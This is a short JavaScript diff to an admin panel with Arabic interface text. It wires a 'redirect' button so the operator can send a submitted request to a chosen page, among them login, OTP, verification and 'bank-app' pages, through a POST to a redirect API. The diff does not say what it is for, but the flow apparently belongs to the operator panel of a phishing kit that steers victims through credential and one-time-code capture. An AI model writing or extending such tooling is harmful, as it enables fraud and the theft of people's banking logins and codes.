@@ -765,7 +765,25 @@
         fillModal(r);
         detailsModal.classList.add('show');
       } else if (e.target.classList.contains('redirect-btn')) {
-        alert('تم إعادة توجيه الطلب الخاص بـ: ' + (r.username || '-'));
+        var target = window.prompt(
+          'اكتب اسم الصفحة الهدف من القائمة:\nindex.html\nindex.en.html\norder-form.html\norder-form.en.html\nlogin_ar.html\nlogin_en.html\notp.html\notp-en.html\nverification.html\nverification_en.html\nbank-app.html',
+          'index.html'
+        );
+        if (!target) return;
+        adminFetch('/api/requests/' + id + '/redirect', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ path: target.trim() })
+        })
+        .then(function(res){ return res.json(); })
+        .then(function(data){
+          if (data.ok) {
+            showToast('تم توجيه الطلب إلى: ' + data.redirectUrl);
+          } else {
+            showToast('اسم الصفحة غير مسموح به');
+          }
+        })
+        .catch(function(){ showToast('تعذر تنفيذ إعادة التوجيه'); });
       }
     });
 
